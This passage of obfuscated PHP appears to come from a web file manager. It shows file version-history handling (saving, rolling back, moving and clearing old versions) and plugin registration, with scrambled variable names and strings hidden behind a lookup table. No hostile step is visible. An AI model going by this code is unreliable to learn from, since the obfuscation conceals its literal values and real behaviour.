$Œ«õÑ´Æ[1338], $Œ«õÑ´Æ[1339])); $Ô‡ôæ‘ = $¥èÄœÑ‹ == count($Á’äª¿®) - 1 && $âïàé˜ì; $ºîãñÎ = $ã™£ŸÙ× . $çú–ÃÀ[$Œ«õÑ´Æ[1345]]; $ëÎŸ•µ = $ã™£ŸÙ× . get_path_this($çú–ÃÀ[$Œ«õÑ´Æ[32]]); if (IO::exist($ºîãñÎ)) { $§ëğáàî = $ºîãñÎ; continue; } $½Úƒå¤ = $¥èÄœÑ‹ == 0 ? get_path_ext($€¦¼¹) : get_path_ext($§ëğáàî); $ˆÑ¼¨š = KodArchive::extract(self::iconvSystem($§ëğáàî), $ã™£ŸÙ×, $çú–ÃÀ[$Œ«õÑ´Æ[1330]], $‚»®œ©Ü, $½Úƒå¤); self::unzipErrorCheck($ˆÑ¼¨š, array($Œ«õÑ´Æ[1351], $ñ·ïú†­, $Á’äª¿®, $çú–ÃÀ, $ºîãñÎ)); if (IO::exist($ëÎŸ•µ)) { IO::rename($ëÎŸ•µ, get_path_this($ºîãñÎ)); } $§ëğáàî = $ºîãñÎ; } $¥ÏŞ¥Âä = $§ëğáàî; return array($Œ«õÑ´Æ[243] => $§ëğáàî, $Œ«õÑ´Æ[1329] => $Á’äª¿®, $Œ«õÑ´Æ[1331] => $ã™£ŸÙ×); } private static function unzipErrorCheck($Ú¯áóä, $©…ğ¢‡á = false) { $×‘Æ˜æ• =& $_SERVER[¬ÏÕ§Áú]; if ($Ú¯áóä[$×‘Æ˜æ•[1352]]) { return !0; } write_log(array($×‘Æ˜æ•[1353], $Ú¯áóä, $©…ğ¢‡á), $×‘Æ˜æ•[1354]); $„Œö¿Û¿ = is_array($Ú¯áóä[$×‘Æ˜æ•[1342]]) ? json_encode($Ú¯áóä[$×‘Æ˜æ•[1342]]) : $Ú¯áóä[$×‘Æ˜æ•[1342]]; show_json($×‘Æ˜æ•[1355] . $„Œö¿Û¿, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $î¡¹ú¬‡ =& $_SERVER[¬ÏÕ§Áú]; $î®—ŸªÅ = $GLOBALS[$î¡¹ú¬‡[6]][$î¡¹ú¬‡[102]]; if ($î®—ŸªÅ[$î¡¹ú¬‡[1356]] != 1) { return; } if ($î®—ŸªÅ[$î¡¹ú¬‡[1357]] <= 0) { return; } if (isset($_REQUEST[$î¡¹ú¬‡[1358]]) && $_REQUEST[$î¡¹ú¬‡[1358]] == $î¡¹ú¬‡[101]) { return; } Hook::bind($î¡¹ú¬‡[1359], $î¡¹ú¬‡[1360]); Hook::bind($î¡¹ú¬‡[1361], $î¡¹ú¬‡[1362]); Hook::bind($î¡¹ú¬‡[1363], $î¡¹ú¬‡[1364]); Hook::bind($î¡¹ú¬‡[1365], $î¡¹ú¬‡[1366]); Hook::bind($î¡¹ú¬‡[1367], $î¡¹ú¬‡[1368]); Hook::bind($î¡¹ú¬‡[1369], $î¡¹ú¬‡[1370]); } public static function eventBeforeUpload($±å¥äÁ) { if ($±å¥äÁ[3] && $±å¥äÁ[3] != REPEAT_REPLACE) { return; } $¢›Û®…Ò = self::parsePath($±å¥äÁ[0]); if (!$¢›Û®…Ò) { return; } self::add($¢›Û®…Ò); } public static function eventBeforeEdit($«´ìÚªæ) { $¨ÌÜ„ç = self::parsePath($«´ìÚªæ[0]); if (!$¨ÌÜ„ç) { return; } self::add($¨ÌÜ„ç); } public static function eventBeforeCopyFile($³›œ…ï, $õÒÁ¿¨, $÷ÉÈÓôª, $Ì¯Ö¶¬Ç, $éÁÂÅá‰, $ö¤ëˆë”) { $ÑÁóŠÅı =& $_SERVER[¬ÏÕ§Áú]; if (isset($÷ÉÈÓôª->_data[$ÑÁóŠÅı[1289]]) && $÷ÉÈÓôª->_data[$ÑÁóŠÅı[1289]]) { return; } $ª¬—…¨½ = $÷ÉÈÓôª->getPathOuter($Ì¯Ö¶¬Ç); $ª–ı“ğ = self::parsePath($ª¬—…¨½); if (!$ª–ı“ğ) { return; } self::add($ª–ı“ğ); } public static function eventBeforeRename($¿Š–ùĞ¡) { $İÒ–×¬ª =& $_SERVER[¬ÏÕ§Áú]; $÷©ÎßğÈ = self::parsePath($¿Š–ùĞ¡[0]); if (!$÷©ÎßğÈ) { return; } $¶‹Û¹‚ = self::checkInHistory($÷©ÎßğÈ); if (!$¶‹Û¹‚) { return; } if ($¶‹Û¹‚[$İÒ–×¬ª[33]] == $İÒ–×¬ª[243]) { $œÎÚÊ = self::listData($÷©ÎßğÈ); if ($œÎÚÊ && $œÎÚÊ[$İÒ–×¬ª[456]]) { self::moveHistory($÷©ÎßğÈ, $¿Š–ùĞ¡[1]); } } else { IO::rename($¶‹Û¹‚[$İÒ–×¬ª[97]], $¿Š–ùĞ¡[1]); } } public static function eventBeforeMove($¬ñ€´ä) { $×ÃÄ»•µ =& $_SERVER[¬ÏÕ§Áú]; $˜•†ë‘í = self::parsePath($¬ñ€´ä[0]); if (!$˜•†ë‘í) { return; } $–ãùÛæ = self::parsePath($¬ñ€´ä[1]); if (!$–ãùÛæ) { return; } $æÊµÓé÷ = $¬ñ€´ä[3]; $ô–Ò¦ÌÊ = self::checkInHistory($˜•†ë‘í); if (!$ô–Ò¦ÌÊ) { return; } $À•ƒÁ¼ = self::pathHistory($–ãùÛæ); if ($ô–Ò¦ÌÊ[$×ÃÄ»•µ[33]] == $×ÃÄ»•µ[243]) { $ºÔÃ–¥ = self::listData($˜•†ë‘í); $Ó‹­¸´ü = rtrim($–ãùÛæ, $×ÃÄ»•µ[8]) . $×ÃÄ»•µ[8] . ($æÊµÓé÷ ? $æÊµÓé÷ : get_path_this($˜•†ë‘í)); $îƒª€ë = self::listData($Ó‹­¸´ü); if ($ºÔÃ–¥ && $ºÔÃ–¥[$×ÃÄ»•µ[456]] && $îƒª€ë && $îƒª€ë[$×ÃÄ»•µ[456]]) { return self::clear($˜•†ë‘í); } if ($ºÔÃ–¥ && $ºÔÃ–¥[$×ÃÄ»•µ[456]]) { self::moveHistory($˜•†ë‘í, $æÊµÓé÷, $À•ƒÁ¼); } } else { IO::move($ô–Ò¦ÌÊ[$×ÃÄ»•µ[97]], $À•ƒÁ¼, !1, $æÊµÓé÷); self::clearEmptyFolder(IO::pathFather($ô–Ò¦ÌÊ[$×ÃÄ»•µ[97]])); } } public static function eventAfterRemove($Ø…œú’Ô, $ïÑß¸Ø) { $ë÷ˆ®ø± =& $_SERVER[¬ÏÕ§Áú]; if (!$ïÑß¸Ø) { return; } $º¸€ÂÎë = self::parsePath($Ø…œú’Ô[0]); if (!$º¸€ÂÎë) { return; } $ÈÑŒÌ‹ = self::checkInHistory($º¸€ÂÎë); if (!$ÈÑŒÌ‹) { return; } if ($ÈÑŒÌ‹[$ë÷ˆ®ø±[33]] == $ë÷ˆ®ø±[243]) { $‰‘»Æîä = self::listData($º¸€ÂÎë, !1); if ($‰‘»Æîä && $‰‘»Æîä[$ë÷ˆ®ø±[456]]) { self::clear($º¸€ÂÎë, !1); } } else { IO::remove($ÈÑŒÌ‹[$ë÷ˆ®ø±[97]]); self::clearEmptyFolder(IO::pathFather($ÈÑŒÌ‹[$ë÷ˆ®ø±[97]])); } } private static function checkInHistory($ãòğĞ½¦) { $ƒß¿¡ûä = self::pathHistory($ãòğĞ½¦); if (!IO::exist($ƒß¿¡ûä)) { $ƒß¿¡ûä .= $_SERVER[¬ÏÕ§Áú][1371]; } return IO::exist($ƒß¿¡ûä) ? IO::info($ƒß¿¡ûä) : !1; } private static function parsePath($‰Éß™ÅÓ) { $­ğĞ£ğŠ =& $_SERVER[¬ÏÕ§Áú]; if (!$‰Éß™ÅÓ) { return !1; } if (isset($GLOBALS[$­ğĞ£ğŠ[1372]]) && $GLOBALS[$­ğĞ£ğŠ[1372]]) { return; } $êÎÕ°ğ = KodIO::parse($‰Éß™ÅÓ); $¯º€Ğœ = $êÎÕ°ğ[$­ğĞ£ğŠ[33]]; $ÉÌÎÆ°Ä = !$¯º€Ğœ || $¯º€Ğœ == KodIO::KOD_IO || $¯º€Ğœ == KodIO::KOD_SHARE_ITEM; if (!$ÉÌÎÆ°Ä || !$êÎÕ°ğ[$­ğĞ£ğŠ[1373]]) { return !1; } if (substr($‰Éß™ÅÓ, 0, strlen(DATA_PATH . $­ğĞ£ğŠ[1374])) == DATA_PATH . $­ğĞ£ğŠ[1374]) { return !1; } if ($¯º€Ğœ == KodIO::KOD_SHARE_ITEM) { $¤Û‹íšµ = IO::init($‰Éß™ÅÓ); if ($¤Û‹íšµ->pathParse[$­ğĞ£ğŠ[1285]]) { return self::parsePath($¤Û‹íšµ->pathParse[$­ğĞ£ğŠ[1285]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ä´¸âÈ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $­ğĞ£ğŠ[1375]); foreach ($Ä´¸âÈ as $¨ŠÊ„˜) { if (!$¯º€Ğœ && substr($‰Éß™ÅÓ, 0, strlen($¨ŠÊ„˜)) == $¨ŠÊ„˜) { return !1; } } self::log($GLOBALS[$­ğĞ£ğŠ[1279]] . $­ğĞ£ğŠ[1376] . $‰Éß™ÅÓ); return $‰Éß™ÅÓ; } private static function pathHistory($™”æ¼Í¦) { $å‚ÌÆšš =& $_SERVER[¬ÏÕ§Áú]; $åÙÌ•û = self::$_historyBase . ltrim(KodIO::clear($™”æ¼Í¦), $å‚ÌÆšš[8]); $åÙÌ•û = str_replace(array($å‚ÌÆšš[1377]), array($å‚ÌÆšš[1378]), $åÙÌ•û); return $åÙÌ•û; } public static function log($÷’ÎšÃü) { } public static function historyCount($âØ©Ù÷ç) { $•Ò³ÃšÙ =& $_SERVER[¬ÏÕ§Áú]; $çîøÍ³ = array(); $“Ÿ²›¬  = array(); foreach ($âØ©Ù÷ç as $÷Ş±²ã“) { $ı¥Ò„«¶ = get_path_father($÷Ş±²ã“); if (!$“Ÿ²›¬ [$ı¥Ò„«¶]) { $“Ÿ²›¬ [$ı¥Ò„«¶] = array(); } $“Ÿ²›¬ [$ı¥Ò„«¶][] = get_path_this($÷Ş±²ã“); } foreach ($“Ÿ²›¬  as $ı¥Ò„«¶ => $ª¹ïÂ¯ß) { $œµé•àú = self::parsePath($ı¥Ò„«¶); if (!$œµé•àú) { continue; } foreach ($ª¹ïÂ¯ß as $ËÏÍƒ„ó) { $ƒ•µ˜Ì¬ = self::listData(rtrim($œµé•àú, $•Ò³ÃšÙ[8]) . $•Ò³ÃšÙ[8] . $ËÏÍƒ„ó, !1); if ($ƒ•µ˜Ì¬ && $ƒ•µ˜Ì¬[$•Ò³ÃšÙ[456]]) { $çîøÍ³[rtrim($ı¥Ò„«¶, $•Ò³ÃšÙ[8]) . $•Ò³ÃšÙ[8] . $ËÏÍƒ„ó] = count($ƒ•µ˜Ì¬[$•Ò³ÃšÙ[456]]); } } } return $çîøÍ³; } public static function add($ç«õÅ) { $‘Õë€òŒ =& $_SERVER[¬ÏÕ§Áú]; $Òî÷öº¬ = self::listData($ç«õÅ); if (!$Òî÷öº¬) { return; } $éÊàº±ª = Model($‘Õë€òŒ[886])->get($‘Õë€òŒ[1379]); $ƒõ»ÀÁ³ = intval($GLOBALS[$‘Õë€òŒ[6]][$‘Õë€òŒ[102]][$‘Õë€òŒ[1357]]); $¯„ªÈ¶À = $éÊàº±ª == $‘Õë€òŒ[1380] ? min(5, $ƒõ»ÀÁ³) : $ƒõ»ÀÁ³; if ($ƒõ»ÀÁ³ <= 0) { return; } $‹Äğé¿— = IO::info($ç«õÅ); $Ÿµæ‘¥¢ = $Òî÷öº¬[$‘Õë€òŒ[456]]; if ($‹Äğé¿—[$‘Õë€òŒ[89]] == 0) { return; } if ($‹Äğé¿—[$‘Õë€òŒ[89]] >= 1024 * 1024 * 500) { return !1; } $éÛ›ÔæÃ = IO::hashSimple($ç«õÅ); if ($Ÿµæ‘¥¢ && $Ÿµæ‘¥¢[0][$‘Õë€òŒ[696]] == $éÛ›ÔæÃ) { return !0; } if (array_key_exists($‘Õë€òŒ[246], $‹Äğé¿—) && !$‹Äğé¿—[$‘Õë€òŒ[246]]) { return !1; } $ˆü†¡ø¥ = short_id(time()); $âıŠ¸Á = array($‘Õë€òŒ[492] => $ˆü†¡ø¥, $‘Õë€òŒ[696] => $éÛ›ÔæÃ, $‘Õë€òŒ[32] => $‹Äğé¿—[$‘Õë€òŒ[32]] . $‘Õë€òŒ[10] . date($‘Õë€òŒ[1381]) . rand_string(1), $‘Õë€òŒ[89] => $‹Äğé¿—[$‘Õë€òŒ[89]], $‘Õë€òŒ[546] => USER_ID, $‘Õë€òŒ[244] => time(), $‘Õë€òŒ[1382] => $‘Õë€òŒ[12]); IO::mkdir($Òî÷öº¬[$‘Õë€òŒ[1383]]); $ÍÃ®’æó = IO::copy($ç«õÅ, $Òî÷öº¬[$‘Õë€òŒ[1383]], !1, $âıŠ¸Á[$‘Õë€òŒ[32]]); if (!$ÍÃ®’æó) { self::clearEmptyFolder($Òî÷öº¬[$‘Õë€òŒ[1383]]); return !1; } array_unshift($Ÿµæ‘¥¢, $âıŠ¸Á); if (count($Ÿµæ‘¥¢) > $¯„ªÈ¶À) { $ªËì¼Ø = array_slice($Ÿµæ‘¥¢, $¯„ªÈ¶À); foreach ($ªËì¼Ø as $Âƒ“üĞ) { IO::remove($Òî÷öº¬[$‘Õë€òŒ[1383]] . $Âƒ“üĞ[$‘Õë€òŒ[32]]); } $Ÿµæ‘¥¢ = array_slice($Ÿµæ‘¥¢, 0, $¯„ªÈ¶À); } return self::saveData($Òî÷öº¬[$‘Õë€òŒ[1384]], $Ÿµæ‘¥¢); } public static function remove($„ äáè­, $Ù Â“òí) { $ÇıÄœè– =& $_SERVER[¬ÏÕ§Áú]; $¶Éßñı½ = self::listData($„ äáè­); $ÏÄ²ŠÙç = array(); if (!$¶Éßñı½) { return !1; } foreach ($¶Éßñı½[$ÇıÄœè–[456]] as $¥»‰ş) { if ($¥»‰ş[$ÇıÄœè–[492]] == $Ù Â“òí) { IO::remove($¶Éßñı½[$ÇıÄœè–[1383]] . $¥»‰ş[$ÇıÄœè–[32]]); continue; } $ÏÄ²ŠÙç[] = $¥»‰ş; } return self::saveData($¶Éßñı½[$ÇıÄœè–[1384]], $ÏÄ²ŠÙç); } public static function clear($‡÷‰ÂÃ™, $·ñëÑ‘ = true) { $ı˜°ø¹¼ =& $_SERVER[¬ÏÕ§Áú]; $¨Ø¬Œ  = self::listData($‡÷‰ÂÃ™, $·ñëÑ‘); if (!$¨Ø¬Œ ) { return !1; } foreach ($¨Ø¬Œ [$ı˜°ø¹¼[456]] as $òéú¾¥‚) { IO::remove($¨Ø¬Œ [$ı˜°ø¹¼[1383]] . $òéú¾¥‚[$ı˜°ø¹¼[32]]); } return self::saveData($¨Ø¬Œ [$ı˜°ø¹¼[1384]], array()); } public static function moveHistory($ü¨ŸÀêĞ, $ÀÖ—áÔŒ = '', $íç Îçü = '') { $“®¨‡×¤ =& $_SERVER[¬ÏÕ§Áú]; $½†Öü‘Ã = self::listData($ü¨ŸÀêĞ, !1); if (!$½†Öü‘Ã || !$½†Öü‘Ã[$“®¨‡×¤[456]]) { return !1; } $èßù×Å§ = $“®¨‡×¤[1371]; $ÀÖ—áÔŒ = $ÀÖ—áÔŒ ? $ÀÖ—áÔŒ : get_path_this($ü¨ŸÀêĞ); $íç Îçü = $íç Îçü ? $íç Îçü : $½†Öü‘Ã[$“®¨‡×¤[1383]]; $«ÌÆ±ø… = substr(get_path_this($½†Öü‘Ã[$“®¨‡×¤[1384]]), 0, -strlen($èßù×Å§)); foreach ($½†Öü‘Ã[$“®¨‡×¤[456]] as $«÷®ÈÅ’ => $«şÌøå) { $ş€ÍÏï¨ = $ÀÖ—áÔŒ . substr($«şÌøå[$“®¨‡×¤[32]], strlen($«ÌÆ±ø…)); $§´×èıœ = IO::move($½†Öü‘Ã[$“®¨‡×¤[1383]] . $«şÌøå[$“®¨‡×¤[32]], $íç Îçü, !1, $ş€ÍÏï¨); if ($§´×èıœ) { $½†Öü‘Ã[$“®¨‡×¤[456]][$«÷®ÈÅ’][$“®¨‡×¤[32]] = $ş€ÍÏï¨; } } $½†Öü‘Ã[$“®¨‡×¤[1384]] = IO::move($½†Öü‘Ã[$“®¨‡×¤[1384]], $íç Îçü, !1, $ÀÖ—áÔŒ . $èßù×Å§); self::saveData($½†Öü‘Ã[$“®¨‡×¤[1384]], $½†Öü‘Ã[$“®¨‡×¤[456]]); self::clearEmptyFolder($½†Öü‘Ã[$“®¨‡×¤[1383]]); } public static function rollback($Şìíø°Ğ, $¬¹°ëÜ) { $­Çôìûñ =& $_SERVER[¬ÏÕ§Áú]; $Ü¨üùÈ« = self::listData($Şìíø°Ğ); if (!$Ü¨üùÈ«) { return; } $Â­â©¾‚ = IO::info($Şìíø°Ğ); foreach ($Ü¨üùÈ«[$­Çôìûñ[456]] as $íÃÛç™ú => $¨„Àõªô) { if ($¨„Àõªô[$­Çôìûñ[492]] == $¬¹°ëÜ) { self::add($Şìíø°Ğ); $½ÌÕáÊì = $Ü¨üùÈ«[$­Çôìûñ[1383]] . $¨„Àõªô[$­Çôìûñ[32]]; $²ÌœìßÜ = IO::copy($½ÌÕáÊì, IO::pathFather($Şìíø°Ğ), REPEAT_REPLACE, $Â­â©¾‚[$­Çôìûñ[32]]); if ($²ÌœìßÜ) { self::remove($Şìíø°Ğ, $¬¹°ëÜ); } return $²ÌœìßÜ; } } return !1; } public static function setDetail($…¢ÂÚßô, $‹ã§€˜“, $“ò•É¿Ê) { $é°Ä®‹à =& $_SERVER[¬ÏÕ§Áú]; $êŠÂ÷° = self::listData($…¢ÂÚßô); if (!$êŠÂ÷°) { return; } foreach ($êŠÂ÷°[$é°Ä®‹à[456]] as $ùİš¯Å => $Ê¡™¦°Ì) { if ($Ê¡™¦°Ì[$é°Ä®‹à[492]] == $‹ã§€˜“) { $êŠÂ÷°[$é°Ä®‹à[456]][$ùİš¯Å][$é°Ä®‹à[1382]] = $“ò•É¿Ê; self::saveData($êŠÂ÷°[$é°Ä®‹à[1384]], $êŠÂ÷°[$é°Ä®‹à[456]]); return !0; } } return !1; } public static function fileInfo($»°í¼¢, $™öâ¤Ùô) { $ó¡Á£Å =& $_SERVER[¬ÏÕ§Áú]; $ìì«Æï” = self::listData($»°í¼¢); if (!$ìì«Æï”) { show_json(LNG($ó¡Á£Å[118]), !1); } $¸Ëæ­Ãş = $ó¡Á£Å[12]; foreach ($ìì«Æï”[$ó¡Á£Å[456]] as $¹­ÁÜ¹¿ => $¶üûÆ­Ï) { if ($¶üûÆ­Ï[$ó¡Á£Å[492]] != $™öâ¤Ùô) { continue; } $¸Ëæ­Ãş = $ìì«Æï”[$ó¡Á£Å[1383]] . $¶üûÆ­Ï[$ó¡Á£Å[32]]; break; } if (!$¸Ëæ­Ãş) { show_json(LNG($ó¡Á£Å[118]), !1); } return IO::info($¸Ëæ­Ãş); } public static function fileOut($›ƒ±Ë, $ı“ŠªØ, $ŠÇÑÂ—Ó = false) { $Ş¤ÃÈı =& $_SERVER[¬ÏÕ§Áú]; $Û’öÇøë = self::fileInfo($›ƒ±Ë, $ı“ŠªØ); $ÛœƒÄİ =& $GLOBALS[$Ş¤ÃÈı[7]]; $ŠÇÑÂ—Ó = isset($ÛœƒÄİ[$Ş¤ÃÈı[1334]]) && $ÛœƒÄİ[$Ş¤ÃÈı[1334]] == 1; if (isset($ÛœƒÄİ[$Ş¤ÃÈı[33]]) && $ÛœƒÄİ[$Ş¤ÃÈı[33]] == $Ş¤ÃÈı[1385]) { return IO::fileOutImage($Û’öÇøë[$Ş¤ÃÈı[97]], $ÛœƒÄİ[$Ş¤ÃÈı[1386]]); } IO::fileOut($Û’öÇøë[$Ş¤ÃÈı[97]], $ŠÇÑÂ—Ó, get_path_this($›ƒ±Ë)); } public static function listData($±Û¨»ª, $ÎìŞØ„Ğ = true) { $À¡ë±Ç =& $_SERVER[¬ÏÕ§Áú]; if ($ÎìŞØ„Ğ && !IO::exist($±Û¨»ª)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($±Û¨»ª, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $û¥‹û¼ = self::pathHistory($±Û¨»ª); $É“ÎÚ‘ = array($À¡ë±Ç[1384] => $û¥‹û¼ . $À¡ë±Ç[1371], $À¡ë±Ç[1383] => rtrim(get_path_father($û¥‹û¼), $À¡ë±Ç[8]) . $À¡ë±Ç[8], $À¡ë±Ç[456] => array()); $º¸ıá»¿ = IO::getContent($É“ÎÚ‘[$À¡ë±Ç[1384]]); if ($º¸ıá»¿) { $€ø±‘— = json_decode($º¸ıá»¿, !0); if (is_array($€ø±‘—)) { $É“ÎÚ‘[$À¡ë±Ç[456]] = $€ø±‘—; } } return $É“ÎÚ‘; } private static function saveData($ë¡šøµ, $›½ûÜ ) { $ı‹Î’Õ =& $_SERVER[¬ÏÕ§Áú]; self::log($ı‹Î’Õ[1387] . $ë¡šøµ . $ı‹Î’Õ[84] . count($›½ûÜ ), $ı‹Î’Õ[865]); if ($›½ûÜ ) { return IO::setContent($ë¡šøµ, json_encode($›½ûÜ )); } $¥ğ—º‰ = IO::pathFather($ë¡šøµ); IO::remove($ë¡šøµ); self::clearEmptyFolder($¥ğ—º‰); return !0; } public static function clearEmptyFolder($Äùòß†á) { $é½¼ã× =& $_SERVER[¬ÏÕ§Áú]; if (trim($Äùòß†á, $é½¼ã×[8]) == trim(self::$_historyBase, $é½¼ã×[8])) { return; } $ÆŒòŸ = IO::pathFather($Äùòß†á); $ûºÑ‰Œ° = IO::has($Äùòß†á, !0); if ($ûºÑ‰Œ°[$é½¼ã×[252]] > 0 || $ûºÑ‰Œ°[$é½¼ã×[253]] > 0) { return; } IO::remove($Äùòß†á); self::clearEmptyFolder($ÆŒòŸ); } private static function getBasePath() { $¿¼Æî‹Ô =& $_SERVER[¬ÏÕ§Áú]; $Î•÷¹ƒÆ = Model($¿¼Æî‹Ô[1388])->get($¿¼Æî‹Ô[1389]); if ($Î•÷¹ƒÆ) { if (!IO::exist($Î•÷¹ƒÆ)) { IO::mkdir($Î•÷¹ƒÆ); } if (get_path_this($Î•÷¹ƒÆ) == $¿¼Æî‹Ô[1374]) { $¢“ÓüÂ = $¿¼Æî‹Ô[1390] . rand_string(8); @rename($Î•÷¹ƒÆ, get_path_father($Î•÷¹ƒÆ) . $¿¼Æî‹Ô[8] . $¢“ÓüÂ); $Î•÷¹ƒÆ = DATA_PATH . $¢“ÓüÂ . $¿¼Æî‹Ô[8]; file_put_contents(DATA_PATH . $¿¼Æî‹Ô[1321], $¿¼Æî‹Ô[12]); Model($¿¼Æî‹Ô[1388])->set($¿¼Æî‹Ô[1389], $Î•÷¹ƒÆ); } return $Î•÷¹ƒÆ; } $Î•÷¹ƒÆ = DATA_PATH . $¿¼Æî‹Ô[1390] . rand_string(8) . $¿¼Æî‹Ô[8]; $Î•÷¹ƒÆ = IO::mkdir($Î•÷¹ƒÆ); $Î•÷¹ƒÆ = rtrim($Î•÷¹ƒÆ, $¿¼Æî‹Ô[8]) . $¿¼Æî‹Ô[8]; file_put_contents($Î•÷¹ƒÆ . $¿¼Æî‹Ô[1321], $¿¼Æî‹Ô[12]); file_put_contents(DATA_PATH . $¿¼Æî‹Ô[1321], $¿¼Æî‹Ô[12]); Model($¿¼Æî‹Ô[1388])->set($¿¼Æî‹Ô[1389], $Î•÷¹ƒÆ); return $Î•÷¹ƒÆ; } } goto C„è¿£„‡Å; DŸ”­ÍâÛï: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x70\154\165\x67\x69\156\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\163\x74\x61\x74\165\163", "\x72\145\147\x69\145\163\164", "\x63\x6f\x6e\x66\151\147"); public function loadList($¾œÌÃİ = false) { $Ï¶€¯šÀ = array_to_keyvalue($this->listData(), $_SERVER[¬ÏÕ§Áú][32]); if ($¾œÌÃİ) { return $Ï¶€¯šÀ[$¾œÌÃİ]; } return $Ï¶€¯šÀ; } public function init() { $ãø³‡¥– =& $_SERVER[¬ÏÕ§Áú]; Hook::trigger($ãø³‡¥–[2160]); $Û­ÅÉÎ€ = $this->loadPluginList(); foreach ($Û­ÅÉÎ€ as $ÂİÒÙ => $­èïÆ‚‘) { $¦ÎùÜÈí = $this->appAllow($ÂİÒÙ, $­èïÆ‚‘); if (!$¦ÎùÜÈí) { continue; } foreach ($­èïÆ‚‘[$ãø³‡¥–[2161]] as $ñ§âĞ¬ó => $Æ¡’©½) { Hook::bind($ñ§âĞ¬ó, $Æ¡’©½); } } Hook::trigger($ãø³‡¥–[2162]); Hook::trigger(ACTION); } public function appAllow($ßïæ½İ½, $ü‹ÍåÜÆ, $ïĞÕİ = true) { $Š†·ÎõÚ =& $_SERVER[¬ÏÕ§Áú]; $ø®±õó = PLUGIN_DIR . $ßïæ½İ½ . $Š†·ÎõÚ[2163]; if (!is_array($ü‹ÍåÜÆ) || !is_array($ü‹ÍåÜÆ[$Š†·ÎõÚ[2161]]) || $ü‹ÍåÜÆ[$Š†·ÎõÚ[863]] != 1 || !is_file($ø®±õó)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Š†·ÎõÚ[6]][$Š†·ÎõÚ[2164]] || !$GLOBALS[$Š†·ÎõÚ[6]][$Š†·ÎõÚ[2165]]) { return !0; } $Û‰åû = explode($Š†·ÎõÚ[50], strtolower($GLOBALS[$Š†·ÎõÚ[6]][$Š†·ÎõÚ[2165]])); return in_array(strtolower($ßïæ½İ½), $Û‰åû) ? !1 : !0; } if ($ïĞÕİ && !Action($Š†·ÎõÚ[2166])->checkAuth($ßïæ½İ½)) { return !1; } return !0; } public function unInstall($Û‚ş§¡) { $‰’š×•Æ =& $_SERVER[¬ÏÕ§Áú]; $Áı¸éÀì = $this->loadList($Û‚ş§¡); if (file_exists(PLUGIN_DIR . $Û‚ş§¡)) { Hook::apply($Û‚ş§¡ . $‰’š×•Æ[2167]); } $this->remove($Áı¸éÀì[$‰’š×•Æ[492]]); } public function changeStatus($‹ì¯Åãï, $¶¶¢¤¿) { $¥şş½¸× =& $_SERVER[¬ÏÕ§Áú]; $û°™ˆ…ó = $this->loadList($‹ì¯Åãï); if ($¶¶¢¤¿) { Hook::apply($‹ì¯Åãï . $¥şş½¸×[2168]); } $this->update($û°™ˆ…ó[$¥şş½¸×[492]], array($¥şş½¸×[2169] => $¶¶¢¤¿)); } public function appRegist($±¹¦¬—œ, $ÖÕÁÁ•±) { $˜ûÚ³Á§ =& $_SERVER[¬ÏÕ§Áú]; $®å†ì®” = $this->loadList($±¹¦¬—œ); if ($®å†ì®”) { $this->update($®å†ì®”[$˜ûÚ³Á§[492]], array($˜ûÚ³Á§[2161] => $ÖÕÁÁ•±)); } else { $ûÄÁŒğö = array($˜ûÚ³Á§[32] => $±¹¦¬—œ, $˜ûÚ³Á§[2161] => $ÖÕÁÁ•±, $˜ûÚ³Á§[863] => 0, $˜ûÚ³Á§[6] => $this->getConfigDefault($±¹¦¬—œ)); $this->insert($ûÄÁŒğö); } } public function getConfigDefault($•¬ûĞ‚š) { $ß”‹á©­ =& $_SERVER[¬ÏÕ§Áú]; $ó şœó½ = array(); $¦Òó–Ùğ = $this->getPackageJson($•¬ûĞ‚š); if (!$¦Òó–Ùğ && is_array($¦Òó–Ùğ[$ß”‹á©­[2170]])) { return $ó şœó½; } foreach ($¦Òó–Ùğ[$ß”‹á©­[2170]] as $™ìö»Î› => $–£æÚÌ²) { if (!isset($–£æÚÌ²[$ß”‹á©­[461]]) || isset($ó şœó½[$™ìö»Î›])) { continue; } $ó şœó½[$™ìö»Î›] = $–£æÚÌ²[$ß”‹á©­[461]]; } return $ó şœó½; } public function getPackageJson($§åò Šî) { return Hook::apply($§åò Šî . $_SERVER[¬ÏÕ§Áú][2171]); } public function getConfig($ÍÃªÛ‘È, $íºêÂ³¾ = false) { $“íŒ¡›Ú =& $_SERVER[¬ÏÕ§Áú]; $û¯î©«Ø = array(); $˜í—îÔÈ = $this->loadList($ÍÃªÛ‘È); if ($˜í—îÔÈ && is_array($˜í—îÔÈ[$“íŒ¡›Ú[6]])) { $û¯î©«Ø = $˜í—îÔÈ[$“íŒ¡›Ú[6]]; } if (!$û¯î©«Ø || $íºêÂ³¾) { $û¯î©«Ø = $this->getConfigDefault($ÍÃªÛ‘È); } return $û¯î©«Ø; } public function setConfig($€äò˜ , $Ìù¹™¸“ = false) { $ª‹êÔåª =& $_SERVER[¬ÏÕ§Áú]; $Â‡á‹³À = $this->loadList($€äò˜ ); if (!$Â‡á‹³À) { return !1; } $üâ¢Ò·Ã = $Â‡á‹³À[$ª‹êÔåª[6]]; if ($Ìù¹™¸“ == !1) { $üâ¢Ò·Ã = array(); $Ìù¹™¸“ = $this->getConfigDefault($€äò˜ ); } foreach ($Ìù¹™¸“ as $àŠš³°Ÿ => $ÕˆÈÄËç) { $üâ¢Ò·Ã[$àŠš³°Ÿ] = is_string($ÕˆÈÄËç) ? trim($ÕˆÈÄËç) : $ÕˆÈÄËç; } $this->update($Â‡á‹³À[$ª‹êÔåª[492]], array($ª‹êÔåª[6] => $üâ¢Ò·Ã)); } public function viewList() { $Í°™ù´æ =& $_SERVER[¬ÏÕ§Áú]; $ƒ£Ô‡ùÜ = $this->loadList(); $this->pluginScan($ƒ£Ô‡ùÜ); $ƒ£Ô‡ùÜ = $this->loadPluginList(); $ëØ÷Ì€ = array(); foreach ($ƒ£Ô‡ùÜ as $””«úÎÃ => $òÛÉ¨şÑ) { $áé–Ü¸÷ = $òÛÉ¨şÑ; 